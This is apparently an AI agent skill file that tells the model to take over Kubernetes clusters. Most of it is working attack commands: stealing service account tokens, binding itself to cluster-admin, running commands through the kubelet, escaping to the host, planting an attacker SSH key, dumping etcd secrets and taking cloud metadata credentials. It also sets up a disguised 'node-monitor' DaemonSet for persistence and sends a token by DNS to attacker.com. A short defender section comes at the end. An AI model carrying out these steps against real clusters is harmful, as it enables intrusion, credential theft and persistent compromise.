---
name: offensive-k8s-attacks
description: "Kubernetes cluster attack techniques covering the full attack lifecycle from initial foothold in a pod to cluster-wide compromise. Covers service account token theft and impersonation, RBAC misconfiguration exploitation including wildcard permissions and privilege escalation via role binding, direct etcd access for secret extraction, kubelet API abuse on port 10250 and read-only port 10255, pod escape via hostPID hostNetwork and hostPath volume mounts, Kubernetes secrets enumeration and decoding, admission controller bypass techniques, network policy bypass and lateral movement, cloud metadata service access from pods for credential theft on AWS EKS GCP GKE and Azure AKS, CRD and operator abuse for persistence, and node compromise via DaemonSet deployment. Tools include kubectl, kube-hunter, peirates, kubeaudit, kdigger, kubeletctl. Maps to MITRE ATT&CK T1609 Container Administration Command, T1610 Deploy Container, T1613 Container and Resource Discovery. Use this skill when assessing Kubernetes clusters, attacking from within a compromised pod, exploiting RBAC or kubelet misconfigurations, or performing cloud-native lateral movement."
---

# Kubernetes Cluster Attacks

You have access to a Kubernetes environment, either through a compromised pod, stolen kubeconfig, or exposed API server. Your objective is to escalate privileges, move laterally, and compromise the cluster or underlying cloud infrastructure. Kubernetes security depends on RBAC policies, network policies, admission controllers, pod security standards, and cloud IAM integration. Each misconfiguration opens a path to deeper access. This skill covers systematic enumeration, privilege escalation, secret extraction, and cluster-wide compromise techniques.

## Quick Workflow

1. Determine your initial position: pod shell, stolen token, exposed API, or kubeconfig file.
2. Enumerate service account permissions, cluster roles, and accessible resources.
3. Identify escalation vectors: RBAC gaps, kubelet exposure, hostPath mounts, cloud metadata access.
4. Escalate privileges by chaining misconfigurations or abusing overprivileged service accounts.
5. Extract secrets, pivot to other namespaces, and target the control plane.
6. Leverage cloud metadata or etcd access for infrastructure-wide compromise.

---

## Phase 1: Initial Enumeration

### Determining Your Position

```bash
# Check if you are inside a pod
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Environment variables set by Kubernetes
env | grep -i kube
env | grep -i kubernetes

# Service host and port are injected into every pod
echo $KUBERNETES_SERVICE_HOST
echo $KUBERNETES_SERVICE_PORT

# DNS resolution for API server
nslookup kubernetes.default.svc.cluster.local

# Determine if kubectl is available
which kubectl 2>/dev/null
# If not, use curl with the service account token
```

### Setting Up API Access Without kubectl

```bash
# Extract token and CA certificate
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# Test API access
curl -s --cacert ${CACERT} -H "Authorization: Bearer ${TOKEN}" \
  ${APISERVER}/api/v1/namespaces

# Shorthand function for repeated use
k8s_api() {
  curl -s --cacert ${CACERT} -H "Authorization: Bearer ${TOKEN}" \
    "${APISERVER}$1"
}

# Check your identity
k8s_api "/apis/authentication.k8s.io/v1/tokenreviews" \
  -X POST -H "Content-Type: application/json" \
  -d "{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"TokenReview\",\"spec\":{\"token\":\"${TOKEN}\"}}"
```

### Automated Enumeration Tools

```bash
# kube-hunter - Kubernetes penetration testing tool
kube-hunter --active --remote $APISERVER

# peirates - Kubernetes penetration tool (run from within pod)
./peirates

# kubeaudit - Audit Kubernetes clusters for security concerns
kubeaudit all -f /path/to/kubeconfig

# kdigger - Kubernetes-focused container assessment
./kdigger dig all

# kubectl auth can-i - Check your permissions
kubectl auth can-i --list
kubectl auth can-i --list --namespace=kube-system
kubectl auth can-i create pods
kubectl auth can-i create pods/exec
kubectl auth can-i get secrets
kubectl auth can-i '*' '*'
```

---

## Phase 2: Service Account Token Theft and Abuse

### Discovering Tokens

```bash
# Default service account token mount
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Projected service account tokens (newer clusters)
ls /var/run/secrets/kubernetes.io/serviceaccount/
# Files: token, ca.crt, namespace

# Search for tokens in environment variables and config files
env | grep -i token
find / -name "kubeconfig" -o -name ".kube" -o -name "config" 2>/dev/null
find / -name "*.kubeconfig" 2>/dev/null

# Check mounted secrets in other pods (if you can list or exec)
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {range .spec.volumes[*]}{.secret.secretName} {end}{"\n"}{end}'

# Look for tokens in etcd, configmaps, or environment variables
kubectl get secrets -A
kubectl get configmaps -A -o yaml | grep -i token
```

### Token Impersonation

```bash
# Use a stolen token to authenticate
kubectl --token="$STOLEN_TOKEN" --server="$APISERVER" \
  --certificate-authority="$CACERT" auth can-i --list

# Impersonate a service account (requires impersonate verb)
kubectl auth can-i impersonate serviceaccounts
kubectl --as=system:serviceaccount:kube-system:default get secrets -n kube-system

# Impersonate a user
kubectl --as=admin@example.com get pods -A

# Impersonate a group
kubectl --as-group=system:masters --as=dummy get secrets -A
```

---

## Phase 3: RBAC Misconfiguration Exploitation

### Identifying Dangerous Permissions

```bash
# List all cluster roles and role bindings
kubectl get clusterroles -o json | python3 -c "
import json,sys
data=json.load(sys.stdin)
for role in data['items']:
    for rule in role.get('spec',{}).get('rules',[]):
        verbs=rule.get('verbs',[])
        resources=rule.get('resources',[])
        if '*' in verbs or '*' in resources:
            print(f\"DANGER: {role['metadata']['name']} - verbs:{verbs} resources:{resources}\")
"

# Check for wildcard permissions
kubectl get clusterrolebindings -o json | python3 -c "
import json,sys
data=json.load(sys.stdin)
for b in data['items']:
    subjects = b.get('subjects',[]) or []
    role = b.get('roleRef',{}).get('name','')
    for s in subjects:
        print(f\"{s.get('kind')}/{s.get('name')} -> {role}\")
"

# Find service accounts bound to cluster-admin
kubectl get clusterrolebindings -o json | \
  python3 -c "
import json,sys
data=json.load(sys.stdin)
for b in data['items']:
    if b.get('roleRef',{}).get('name')=='cluster-admin':
        for s in (b.get('subjects') or []):
            print(f\"cluster-admin: {s.get('kind')}/{s.get('namespace','')}/{s.get('name')}\")
"
```

### Escalation via RBAC Gaps

```bash
# If you can create role bindings, bind yourself to cluster-admin
kubectl create clusterrolebinding pwn-binding \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default

# If you can create roles, grant yourself wildcard access
cat <<'EOF' | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: pwn-role
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pwn-role-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: pwn-role
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
EOF

# If you can patch existing bindings
kubectl patch clusterrolebinding existing-binding -p \
  '{"subjects":[{"kind":"ServiceAccount","name":"default","namespace":"default"}]}'

# Escalate through escalate verb
# The "escalate" verb on roles/clusterroles allows granting permissions
# you do not have yourself
kubectl auth can-i escalate clusterroles
```

---

## Phase 4: Kubelet API Exploitation

### Accessing Kubelet Directly

```bash
# Kubelet API runs on port 10250 (authenticated) and 10255 (read-only, deprecated)
# Scan for kubelet ports across cluster nodes

# Read-only port (10255) - no auth required if exposed
curl -s http://NODE_IP:10255/pods | python3 -m json.tool
curl -s http://NODE_IP:10255/spec/
curl -s http://NODE_IP:10255/metrics

# Authenticated port (10250) - requires valid credentials
# Use service account token or client certificate
curl -sk https://NODE_IP:10250/pods \
  -H "Authorization: Bearer ${TOKEN}"

# List running pods on the node
curl -sk https://NODE_IP:10250/runningpods/ \
  -H "Authorization: Bearer ${TOKEN}"
```

### Command Execution via Kubelet

```bash
# kubeletctl tool for kubelet API interaction
kubeletctl -s NODE_IP pods
kubeletctl -s NODE_IP scan rce

# Execute commands in pods via kubelet API directly (bypasses API server RBAC)
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME \
  -H "Authorization: Bearer ${TOKEN}" \
  -d "cmd=id"

# Execute in every container on the node
curl -sk https://NODE_IP:10250/runningpods/ \
  -H "Authorization: Bearer ${TOKEN}" | \
  python3 -c "
import json,sys
pods=json.load(sys.stdin)
for pod in pods.get('items',[]):
    ns=pod['metadata']['namespace']
    name=pod['metadata']['name']
    for c in pod['spec'].get('containers',[]):
        print(f'{ns}/{name}/{c[\"name\"]}')
"
# Then exec into each one to extract tokens and secrets

# Retrieve container logs
curl -sk "https://NODE_IP:10250/containerLogs/NAMESPACE/POD/CONTAINER" \
  -H "Authorization: Bearer ${TOKEN}"
```

---

## Phase 5: Pod Escape via Privileged Configuration

### hostPID Escape

```bash
# If the pod has hostPID: true, you see all host processes
ps aux  # Shows host processes

# Access host filesystem via /proc/1/root
ls -la /proc/1/root/
cat /proc/1/root/etc/shadow
cat /proc/1/root/etc/kubernetes/manifests/kube-apiserver.yaml

# nsenter into host namespaces
nsenter -t 1 -m -u -i -n -p -- bash

# Steal tokens from other pods' processes
for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
  token=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i kube)
  if [ -n "$token" ]; then
    cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')
    echo "PID $pid ($cmdline): $token"
  fi
done
```

### hostNetwork Escape

```bash
# If the pod has hostNetwork: true, you share the host's network namespace
ip addr show  # Shows host network interfaces

# Access services bound to localhost on the host
curl -s http://127.0.0.1:10255/pods  # Kubelet read-only
curl -sk https://127.0.0.1:10250/pods  # Kubelet API
curl -s http://127.0.0.1:2379/version  # etcd (if exposed)

# Access cloud metadata from host network perspective
curl -s http://169.254.169.254/latest/meta-data/  # AWS
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/  # GCP
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"  # Azure

# Scan internal services
for port in 443 8443 6443 2379 10250 10255 30000-32767; do
  timeout 1 bash -c "echo >/dev/tcp/127.0.0.1/$port" 2>/dev/null && echo "Port $port open"
done
```

### hostPath Volume Escape

```bash
# If the pod mounts a hostPath volume, you can read/write host files
# Common dangerous hostPath mounts:
# /               - full host filesystem
# /var/run        - container runtime sockets
# /etc            - host configuration
# /var/log        - host logs (may contain secrets)
# /root           - root home directory

# Check what is mounted
mount | grep -v overlay
cat /proc/1/mountinfo

# If / is mounted at /host
cat /host/etc/shadow
cat /host/etc/kubernetes/admin.conf
cat /host/root/.kube/config

# Write SSH key for host access
echo "ssh-rsa AAAA... attacker" >> /host/root/.ssh/authorized_keys

# Access Docker socket if mounted
ls -la /host/var/run/docker.sock
```

### Deploying a Privileged Pod

```bash
# If you can create pods, deploy one with full host access
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: pwn-pod
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
  tolerations:
  - operator: Exists
  nodeSelector:
    node-role.kubernetes.io/control-plane: ""
EOF

# Wait for pod to be ready, then exec in
kubectl exec -it pwn-pod -- nsenter -t 1 -m -u -i -n -p -- bash
```

---

## Phase 6: Secrets Enumeration and Extraction

### Kubernetes Secrets

```bash
# List all secrets across namespaces
kubectl get secrets -A

# Get specific secret content (base64 encoded)
kubectl get secret SECRET_NAME -n NAMESPACE -o json

# Decode all secrets in a namespace
kubectl get secrets -n NAMESPACE -o json | python3 -c "
import json,sys,base64
data=json.load(sys.stdin)
for secret in data['items']:
    name=secret['metadata']['name']
    print(f'=== {name} ===')
    for k,v in (secret.get('data') or {}).items():
        try:
            decoded=base64.b64decode(v).decode('utf-8','replace')
            print(f'  {k}: {decoded}')
        except:
            print(f'  {k}: [binary data]')
"

# Target high-value secrets
kubectl get secrets -A -o json | python3 -c "
import json,sys
data=json.load(sys.stdin)
for s in data['items']:
    name=s['metadata']['name']
    ns=s['metadata']['namespace']
    stype=s.get('type','')
    if any(x in name.lower() for x in ['admin','root','cloud','aws','gcp','azure','password','key','cert','token','db','database','api']):
        print(f'HIGH-VALUE: {ns}/{name} (type: {stype})')
"
```

### etcd Direct Access

```bash
# etcd stores all Kubernetes state including secrets in plaintext (unless encrypted at rest)
# Default port: 2379 (client), 2380 (peer)

# Check if etcd is accessible
curl -s http://ETCD_IP:2379/version
curl -s http://127.0.0.1:2379/version  # From host network

# If etcd requires TLS, find certificates
# On control plane nodes, check:
ls -la /etc/kubernetes/pki/etcd/
# ca.crt, server.crt, server.key, peer.crt, peer.key

# Use etcdctl with certs
ETCDCTL_API=3 etcdctl \
  --endpoints=https://ETCD_IP:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only | head -50

# Dump all secrets from etcd
ETCDCTL_API=3 etcdctl \
  --endpoints=https://ETCD_IP:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix

# Extract specific secret
ETCDCTL_API=3 etcdctl \
  --endpoints=https://ETCD_IP:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/kube-system/admin-token
```

---

## Phase 7: Cloud Metadata from Pods

### AWS EKS

```bash
# Access Instance Metadata Service (IMDS) from pod
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/NODE_ROLE_NAME

# IMDSv2 (requires token)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# EKS-specific: IRSA (IAM Roles for Service Accounts)
# Check for projected token and annotated service account
cat $AWS_WEB_IDENTITY_TOKEN_FILE
echo $AWS_ROLE_ARN

# Use AWS CLI with stolen role
aws sts assume-role-with-web-identity \
  --role-arn "$AWS_ROLE_ARN" \
  --role-session-name pwn \
  --web-identity-token "$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)"

# Enumerate EKS cluster from stolen node credentials
aws eks describe-cluster --name CLUSTER_NAME
aws eks list-clusters
```

### GCP GKE

```bash
# GCP metadata server
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes

# Get access token for GCP APIs
ACCESS_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | \
  python3 -c "import json,sys;print(json.load(sys.stdin)['access_token'])")

# Use token to access GCP APIs
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://www.googleapis.com/compute/v1/projects/PROJECT_ID/zones/ZONE/instances"

# Workload Identity check
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/attributes/cluster-name
```

### Azure AKS

```bash
# Azure Instance Metadata Service
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get managed identity token
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Use token for Azure Resource Manager
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | \
  python3 -c "import json,sys;print(json.load(sys.stdin)['access_token'])")

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

---

## Phase 8: Admission Controller Bypass and Persistence

### Bypassing Admission Controllers

```bash
# Check which admission controllers are active
kubectl get validatingwebhookconfigurations
kubectl get mutatingwebhookconfigurations

# Inspect webhook configuration for bypass opportunities
kubectl get validatingwebhookconfigurations -o json | python3 -c "
import json,sys
data=json.load(sys.stdin)
for wh in data['items']:
    name=wh['metadata']['name']
    for w in wh.get('webhooks',[]):
        ns_selector=w.get('namespaceSelector',{})
        obj_selector=w.get('objectSelector',{})
        failure=w.get('failurePolicy','Fail')
        print(f'{name}/{w[\"name\"]}: failurePolicy={failure}')
        if ns_selector:
            print(f'  namespaceSelector: {json.dumps(ns_selector)}')
        if failure == 'Ignore':
            print(f'  BYPASS: failurePolicy=Ignore - webhook failures are ignored')
"

# If failurePolicy is Ignore, you can create resources when webhook is down
# If namespaceSelector excludes certain namespaces, deploy there

# Deploy to kube-system (often excluded from admission policies)
kubectl run pwn --image=alpine -n kube-system -- sleep 3600

# Use static pods (bypass API server admission entirely)
# Write manifest to /etc/kubernetes/manifests/ on a node
cat > /host/etc/kubernetes/manifests/pwn.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: pwn-static
  namespace: kube-system
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: root
      mountPath: /host
  volumes:
  - name: root
    hostPath:
      path: /
EOF
```

### CRD and Operator Abuse

```bash
# List custom resource definitions
kubectl get crds

# Check for operators with elevated privileges
kubectl get deployments -A -o json | python3 -c "
import json,sys
data=json.load(sys.stdin)
for d in data['items']:
    name=d['metadata']['name']
    ns=d['metadata']['namespace']
    sa=d['spec']['template']['spec'].get('serviceAccountName','default')
    if any(x in name.lower() for x in ['operator','controller','manager']):
        print(f'{ns}/{name} (SA: {sa})')
"

# If you can create CRDs, install a backdoor operator
# If you can modify existing CRs, inject malicious configurations
# Example: modify a CR that triggers pod creation with your image
```

### Persistence via DaemonSet

```bash
# Deploy a DaemonSet that runs on every node
cat <<'EOF' | kubectl apply -f -
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-monitor
  namespace: kube-system
  labels:
    app: node-monitor
spec:
  selector:
    matchLabels:
      app: node-monitor
  template:
    metadata:
      labels:
        app: node-monitor
    spec:
      hostPID: true
      hostNetwork: true
      tolerations:
      - operator: Exists
      containers:
      - name: monitor
        image: alpine
        command: ["/bin/sh", "-c"]
        args:
        - |
          while true; do
            # Beacon to C2 or maintain reverse shell
            sleep 3600
          done
        securityContext:
          privileged: true
        volumeMounts:
        - name: host
          mountPath: /host
      volumes:
      - name: host
        hostPath:
          path: /
EOF
```

---

## Phase 9: Network Policy Bypass

```bash
# Check if network policies exist
kubectl get networkpolicies -A

# If no policies exist, all pod-to-pod traffic is allowed by default
# Even with policies, bypass opportunities include:

# 1. DNS-based exfiltration (port 53 is rarely blocked)
# Encode data in DNS queries
nslookup $(cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 | head -c 60).attacker.com

# 2. Metadata service (169.254.169.254) may not be covered by network policies
curl -s http://169.254.169.254/latest/meta-data/

# 3. NodePort services bypass pod-level network policies
# Access services via node IP and NodePort (30000-32767)

# 4. Host network pods bypass network policies entirely
# If you can create hostNetwork pods, you bypass all CNI-level restrictions

# 5. Service mesh sidecar bypass
# If Istio/Linkerd sidecars are present, traffic between pods goes through the mesh
# Direct pod IP access (bypassing service) may skip mesh-level policies

# 6. Check for misconfigured egress policies
kubectl get networkpolicies -A -o json | python3 -c "
import json,sys
data=json.load(sys.stdin)
for np in data['items']:
    name=np['metadata']['name']
    ns=np['metadata']['namespace']
    egress=np['spec'].get('egress')
    if egress is None:
        print(f'{ns}/{name}: no egress rules (all egress blocked if policyTypes includes Egress)')
    elif len(egress)==1 and egress[0]=={}:
        print(f'{ns}/{name}: WIDE OPEN egress (empty rule = allow all)')
"
```

---

## Detection / Defender View

Defenders monitoring for Kubernetes cluster attacks should watch for:

- **Audit logging**: Enable and monitor Kubernetes audit logs for unusual API calls. Watch for `create` or `patch` on `clusterrolebindings`, `roles`, `pods/exec`, and `secrets`. Track service account token usage outside normal application patterns.
- **RBAC alerts**: Alert on creation of ClusterRoleBindings to `cluster-admin`. Monitor for wildcard permissions in new roles. Track `escalate`, `bind`, and `impersonate` verb usage.
- **Kubelet access**: Monitor for direct kubelet API connections (10250) that do not originate from the API server. Disable the read-only port (10255) entirely.
- **Pod security**: Enforce Pod Security Standards (restricted profile). Alert on pod creation with `hostPID`, `hostNetwork`, `hostPath`, or `privileged: true`. Watch for pods running in `kube-system` that are not part of the standard control plane.
- **Secrets access patterns**: Monitor for bulk secret reads across namespaces. Alert on service accounts accessing secrets they do not normally access. Enable encryption at rest for etcd.
- **Network monitoring**: Watch for pod-to-metadata-service traffic (169.254.169.254). Monitor DNS query patterns for tunneling indicators. Alert on pod-to-pod traffic that bypasses service abstractions.
- **Cloud IAM**: Restrict IMDS access to pods that need it (use network policies or cloud-native controls). Use workload identity instead of node-level IAM roles. Audit cloud API calls originating from Kubernetes nodes.
- **Falco and runtime**: Deploy runtime security monitoring. Detect unexpected process execution, network connections, and file access in containers. Watch for `nsenter`, `kubectl`, and `curl` to API endpoints from application pods.

---

## Engagement Cheatsheet

```bash
# --- Initial Recon ---
# Get current permissions
kubectl auth can-i --list
kubectl auth can-i --list -n kube-system
kubectl auth can-i create pods
kubectl auth can-i get secrets --all-namespaces

# Enumerate cluster
kubectl cluster-info
kubectl get nodes -o wide
kubectl get namespaces
kubectl get pods -A -o wide
kubectl get services -A

# --- Secrets ---
kubectl get secrets -A
kubectl get secret <name> -n <ns> -o jsonpath='{.data}' | python3 -c "import json,sys,base64;[print(f'{k}: {base64.b64decode(v).decode()}') for k,v in json.load(sys.stdin).items()]"

# --- Privilege Escalation ---
# Create cluster-admin binding
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default

# Deploy privileged pod
kubectl run pwn --image=alpine --overrides='{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"pwn","image":"alpine","command":["sleep","3600"],"securityContext":{"privileged":true},"volumeMounts":[{"name":"h","mountPath":"/host"}]}],"volumes":[{"name":"h","hostPath":{"path":"/"}}]}}' --restart=Never

# --- Kubelet ---
curl -sk https://NODE_IP:10250/runningpods/ -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER -d "cmd=id" -H "Authorization: Bearer $TOKEN"

# --- Cloud Metadata ---
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# --- Lateral Movement ---
# Exec into other pods
kubectl get pods -A
kubectl exec -it POD_NAME -n NAMESPACE -- /bin/sh

# Port forward to internal services
kubectl port-forward svc/SERVICE 8080:80 -n NAMESPACE
```

---

## Key References

- MITRE ATT&CK T1609 - Container Administration Command
- MITRE ATT&CK T1610 - Deploy Container
- MITRE ATT&CK T1613 - Container and Resource Discovery
- MITRE ATT&CK T1552.007 - Container API / Kubernetes Secrets
- Tool: kube-hunter - https://github.com/aquasecurity/kube-hunter
- Tool: peirates - https://github.com/inguardians/peirates
- Tool: kubeaudit - https://github.com/Shopify/kubeaudit
- Tool: kdigger - https://github.com/quarkslab/kdigger
- Tool: kubeletctl - https://github.com/cyberark/kubeletctl
- Kubernetes Security Documentation - https://kubernetes.io/docs/concepts/security/
- Kubernetes Threat Matrix (Microsoft) - https://microsoft.github.io/Threat-Matrix-for-Kubernetes/
- Kubernetes Hardening Guide (NSA/CISA) - https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF
- HackTricks Kubernetes Pentesting - https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes
